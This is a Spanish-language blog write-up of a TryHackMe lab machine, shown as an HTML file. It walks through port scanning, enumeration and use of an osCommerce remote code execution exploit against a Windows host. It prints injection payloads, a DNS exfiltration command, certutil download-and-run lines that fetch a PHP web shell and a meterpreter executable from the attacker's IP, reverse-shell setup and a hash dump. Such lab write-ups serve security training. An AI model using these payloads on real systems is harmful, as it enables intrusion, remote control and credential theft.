@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <a name="top"></a>
+  
+    <title>TryHackMe - Wgel CTF :: sckull — HackTheBox Writeups, CTF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Titulo Wgel CTF     Room Blueprint   Info Hack into this Windows machine and escalate your privileges to Administrator.   Puntos 565   Dificultad Facil   Maker MrSeth6797    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.
+root@aoiri:~/tryhackme/blueprint# masscan -p1-65535,U:1-65535 blueprint.thm -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-13 06:32:11 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49154/tcp on blueprint."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://sckull.github.io/posts/blueprint/" />
+
+
+<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://sckull.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
+
+<script src="https://use.fontawesome.com/63acf4d7a3.js"></script>
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="TryHackMe - Wgel CTF :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Titulo Wgel CTF     Room Blueprint   Info Hack into this Windows machine and escalate your privileges to Administrator.   Puntos 565   Dificultad Facil   Maker MrSeth6797    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.
+root@aoiri:~/tryhackme/blueprint# masscan -p1-65535,U:1-65535 blueprint.thm -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-13 06:32:11 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49154/tcp on blueprint." />
+<meta name="twitter:site" content="https://sckull.github.io" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="https://sckull.github.io/../../image/tryhackme/blueprint/cover.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="TryHackMe - Wgel CTF :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Titulo Wgel CTF     Room Blueprint   Info Hack into this Windows machine and escalate your privileges to Administrator.   Puntos 565   Dificultad Facil   Maker MrSeth6797    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.
+root@aoiri:~/tryhackme/blueprint# masscan -p1-65535,U:1-65535 blueprint.thm -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-13 06:32:11 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49154/tcp on blueprint." />
+<meta property="og:url" content="https://sckull.github.io/posts/blueprint/" />
+<meta property="og:site_name" content="TryHackMe - Wgel CTF" />
+<meta property="og:image" content="https://sckull.github.io/../../image/tryhackme/blueprint/cover.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />
+
+
+<script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "https://sckull.github.io"
+        },
+        "articleSection" : "posts",
+        "name" : "TryHackMe - Wgel CTF",
+        "headline" : "TryHackMe - Wgel CTF",
+        "description" : "Titulo Wgel CTF     Room Blueprint   Info Hack into this Windows machine and escalate your privileges to Administrator.   Puntos 565   Dificultad Facil   Maker MrSeth6797    MASSCAN &amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.
+root@aoiri:~/tryhackme/blueprint# masscan -p1-65535,U:1-65535 blueprint.thm -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-13 06:32:11 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49154/tcp on blueprint.",
+        "inLanguage" : "en-US",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2019",
+        "datePublished": "2019-12-27 00:00:00 &#43;0000 UTC",
+        "dateModified" : "2019-12-27 00:00:00 &#43;0000 UTC",
+        "url" : "https://sckull.github.io/posts/blueprint/",
+        "wordCount" : "1162",
+        "keywords" : [ "tryhackme","Blog" ]
+    }
+    </script>
+
+
+<meta property="article:published_time" content="2019-12-27 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+</head>
+<body class="">
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://sckull.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://sckull.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+
+  <div class="post">
+    <h2 class="post-title"><a href="https://sckull.github.io/posts/blueprint/">TryHackMe - Wgel CTF</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            Friday, Dec 27, 2019
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">
+        
+         <a class="button-tag" href="https://sckull.github.io/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="https://sckull.github.io/posts/blueprint/../../image/tryhackme/blueprint/cover.png" class="post-cover center" />
+      
+      <hr />
+     
+    
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Titulo</th>
+<th>Wgel CTF</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Room</td>
+<td>Blueprint</td>
+</tr>
+
+<tr>
+<td>Info</td>
+<td>Hack into this Windows machine and escalate your privileges to Administrator.</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>565</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Facil</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://tryhackme.com/p/MrSeth6797">MrSeth6797</a></td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2 id="masscan-nmap">MASSCAN &amp; NMAP</h2>
+
+<p>Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/blueprint# masscan -p1-65535,U:1-65535 blueprint.thm -e tun0
+
+Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-13 06:32:11 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 49154/tcp on blueprint.thm                                 
+Discovered open port 49159/tcp on blueprint.thm                                 
+Discovered open port 137/udp on blueprint.thm                                   
+Discovered open port 135/tcp on blueprint.thm                                   
+Discovered open port 8080/tcp on blueprint.thm                                  
+Discovered open port 139/tcp on blueprint.thm                                   
+Discovered open port 3306/tcp on blueprint.thm                                  
+Discovered open port 49152/tcp on blueprint.thm                                 
+Discovered open port 445/tcp on blueprint.thm                                   
+Discovered open port 49160/tcp on blueprint.thm                                 
+Discovered open port 49153/tcp on blueprint.thm                                 
+Discovered open port 49155/tcp on blueprint.thm                                 
+Discovered open port 443/tcp on blueprint.thm
+
+# Nmap 7.80 scan initiated Fri Dec 13 00:33:25 2019 as: nmap -sV -sC -o nmap_scan blueprint.thm
+Nmap scan report for blueprint.thm (blueprint.thm)
+Host is up (0.23s latency).
+Not shown: 987 closed ports
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: 404 - File or directory not found.
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
+|_http-title: Bad request!
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp  open  mysql        MariaDB (unauthorized)
+8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
+|_http-title: Index of /
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 0s, deviation: 1s, median: 0s
+|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:a9:aa:22:09:2e (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: BLUEPRINT
+|   NetBIOS computer name: BLUEPRINT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2019-12-13T06:35:06+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-12-13T06:35:05
+|_  start_date: 2019-12-13T06:32:08
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Dec 13 00:35:22 2019 -- 1 IP address (1 host up) scanned in 116.94 seconds
+</code></pre>
+
+<h2 id="http">HTTP</h2>
+
+<p>Encontramos que en el puerto 8080 esta corriendo osCommerce.</p>
+
+<p><img src="../../image/tryhackme/blueprint/Screenshot_2019-12-27_22-24-42.png" alt="image" /></p>
+
+<h2 id="gobuster">GOBUSTER</h2>
+
+<p>Utilzamos gobuster en el directorio de oscommers para buscar archivos que puedan ser de utilidad.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/blueprint# gobuster dir -u http://blueprint.thm:8080/oscommerce-2.3.4/catalog/ -x php,html,txt,aspx,asp -t 15 -q -w /usr/share/wordlists/dirb/common.txt 
+/account_history.php (Status: 302)
+/account_edit.php (Status: 302)
+/ADMIN (Status: 301)
+/admin (Status: 301)
+/Admin (Status: 301)
+/advanced_search.php (Status: 200)
+/com2 (Status: 403)
+/com2.php (Status: 403)
+/com2.html (Status: 403)
+/com2.txt (Status: 403)
+/com2.aspx (Status: 403)
+/com2.asp (Status: 403)
+/com3 (Status: 403)
+/com3.aspx (Status: 403)
+/com3.asp (Status: 403)
+/com3.php (Status: 403)
+/com3.html (Status: 403)
+/com3.txt (Status: 403)
+/conditions.php (Status: 200)
+/contact_us.php (Status: 200)
+/cookie_usage.php (Status: 200)
+/Download (Status: 401)
+/Download.php (Status: 200)
+/download (Status: 401)
+/download.php (Status: 200)
+/ext (Status: 301)
+/images (Status: 301)
+/Images (Status: 301)
+/includes (Status: 301)
+/index.php (Status: 200)
+/index.php (Status: 200)
+/Index.php (Status: 200)
+/Login.php (Status: 200)
+/login.php (Status: 200)
+/lpt1 (Status: 403)
+/lpt1.txt (Status: 403)
+/lpt1.aspx (Status: 403)
+/lpt1.asp (Status: 403)
+/lpt1.php (Status: 403)
+/lpt1.html (Status: 403)
+/lpt2 (Status: 403)
+/lpt2.php (Status: 403)
+/lpt2.html (Status: 403)
+/lpt2.txt (Status: 403)
+/lpt2.aspx (Status: 403)
+/lpt2.asp (Status: 403)
+/nul (Status: 403)
+/nul.php (Status: 403)
+/nul.html (Status: 403)
+/nul.txt (Status: 403)
+/nul.aspx (Status: 403)
+/nul.asp (Status: 403)
+/opensearch.php (Status: 200)
+/popup_image.php (Status: 200)
+/prn (Status: 403)
+/prn.php (Status: 403)
+/prn.html (Status: 403)
+/prn.txt (Status: 403)
+/prn.aspx (Status: 403)
+/prn.asp (Status: 403)
+/product_reviews.php (Status: 302)
+/products_new.php (Status: 200)
+/pub (Status: 301)
+/redirect.php (Status: 302)
+/reviews.php (Status: 200)
+/shipping.php (Status: 200)
+/shopping_cart.php (Status: 200)
+/specials.php (Status: 200)
+/ssl_check.php (Status: 200)
+/tell_a_friend.php (Status: 302)
+</code></pre>
+
+<h2 id="searcsploit">SEARCSPLOIT</h2>
+
+<p>Con el nombre y la version de oscommerce encontramos varias vulnerabilidades y exploits que afectan a esta plataforma.</p>
+
+<p><img src="../../image/tryhackme/blueprint/Screenshot_2019-12-27_22-27-20.png" alt="image" /></p>
+
+<h2 id="oscommerce-2-3-4-1-remote-code-execution">osCommerce 2.3.4.1 - Remote Code Execution</h2>
+
+<p>Utilizamos el exploit <code>Remote Code Execution</code>, nos permitira ejecutar comandos en el sistema, pero para ello debemos de configurar la ruta de la maquina en el exploit, de igual forma el payload que ejecuta una shell inversa no funciona ya que es un sistema windows.</p>
+
+<p>Para poder ver el resultado de la ejecucion de nuestro comando podemos utilizar la tecnica de <a href="https://www.youtube.com/watch?v=Egwp5zc5ZIM"><strong>DNS exfil</strong></a> (y por los loles xd).</p>
+
+<p>Nuestro payload se veria de la siguiente forma si deseamos ver el path donde estamos actualmente.</p>
+
+<pre><code class="language-shell">cmd.exe /C cd c:/ &amp; 10.8.1.72 &amp; for /f %i in (\' @echo %cd% \') do nslookup %i 10.8.1.72
+</code></pre>
+
+<p>Con la configuracion (IP, Puerto y directorio de la plataforma) realizada, podemos correr <code>responder</code> en la interfaz <code>tun0</code>, y al lanzar nuestro exploit nos aparecera la ruta en una solicitud de DNS de responder.</p>
+
+<p><img src="../../image/tryhackme/blueprint/Screenshot_2019-12-27_22-47-14.png" alt="image" /></p>
+
+<p>Vemos que desordenada la informacion pero el path actual es:</p>
+
+<pre><code>C:/xampp/htdocs/oscommerce.2.3.4/catalog/install/includes/
+</code></pre>
+
+<p>Sabiendo esto podemos verificar si podemos escribir y crear dentro de archivos con el payload:</p>
+
+<pre><code class="language-php">payload = '\');'
+payload += '$var = shell_exec(&quot;cmd.exe /C echo \'hello\' &gt; hehe.txt &amp; nslookup test 10.8.1.72 &quot;);' 
+payload += 'echo $var;'
+payload += '/*'
+</code></pre>
+
+<p>Vemos que que el archivo se creó exitosamente:</p>
+
+<p><img src="../../image/tryhackme/blueprint/Screenshot_2019-12-27_22-51-46.png" alt="image" /></p>
+
+<p>Utilizamos este pequeño codigo php para ejecutar comandos, lo alojamos en nuestra maquina y levantamos un servidor web con python3:</p>
+
+<pre><code class="language-php">&lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;
+</code></pre>
+
+<p>Nuestro payload para descargar el archivo en la maquina utilizando <code>certutil</code>:</p>
+
+<pre><code class="language-php">payload = '\');'
+payload += '$var = shell_exec(&quot;cmd.exe /C certutil -urlcache -split -f http://10.8.1.72/shell.php shell.php &amp; nslookup test 10.8.1.72 &quot;);' 
+payload += 'echo $var;'
+payload += '/*'
+</code></pre>
+
+<p><img src="../../image/tryhackme/blueprint/Screenshot_2019-12-27_23-07-26.png" alt="image" /></p>
+
+<p>Vemos nuestro archivo y ejecutamos comandos:</p>
+
+<p><img src="../../image/tryhackme/blueprint/Screenshot_2019-12-27_23-13-14.png" alt="image" /></p>
+
+<p>Tenemos permisos de administrador en la maquina y podemos ver la direccion actual en la que nos encontramos, de igual forma podemos leer nuestra bandera que se encuentra en el directorio del usuario administrator.</p>
+
+<p><img src="../../image/tryhackme/blueprint/Screenshot_2019-12-27_23-15-29.png" alt="image" /></p>
+
+<h2 id="shell-metasploit">Shell - Metasploit</h2>
+
+<p>Utilizando metasploit con certutil podemos obtener una shell y sacar el archivo que contiene los hash de los usuarios en windows para ello vamos a crear nuestro payload con msfvenom y poner a la escucha metasploit.</p>
+
+<p>Msfvenom:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=1338 -f exe &gt; shell.exe
+</code></pre>
+
+<p>Metasploit:</p>
+
+<pre><code class="language-bash">use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost tun0
+set lport 1338
+exploit
+</code></pre>
+
+<p>Payload - exploit osCommerce:</p>
+
+<pre><code class="language-php">payload = '\');'
+payload += '$var = shell_exec(&quot;cmd.exe /C certutil.exe -urlcache -split -f http://10.8.1.72/shell.exe shell.exe &amp; shell.exe &amp; nslookup test 10.8.1.72 &quot;);' 
+payload += 'echo $var;'
+payload += '/*'
+</code></pre>
+
+<p>Obtuvimos una sesion meterpreter:</p>
+
+<p><img src="../../image/tryhackme/blueprint/Screenshot_2019-12-27_23-27-37.png" alt="image" /></p>
+
+<p>Para obtener los hash utilizamos el comando hashdump, los cuales podemos crackear utilizando john o hashcat:
+<img src="../../image/tryhackme/blueprint/Screenshot_2019-12-27_23-28-18.png" alt="image" /></p>
+
+    </div>    
+    <hr />
+    <div >
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+      
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="https://sckull.github.io/posts/wgel/">
+                <span class="button__text">TryHackMe - Wgel CTF</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    
+    </div>
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://sckull.github.io/assets/main.js"></script>
+<script src="https://sckull.github.io/assets/prism.js"></script>
+
+
+  
+  
+  
+  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
+
+</div>
+
+
+
+
+
+
+</body>
+</html>
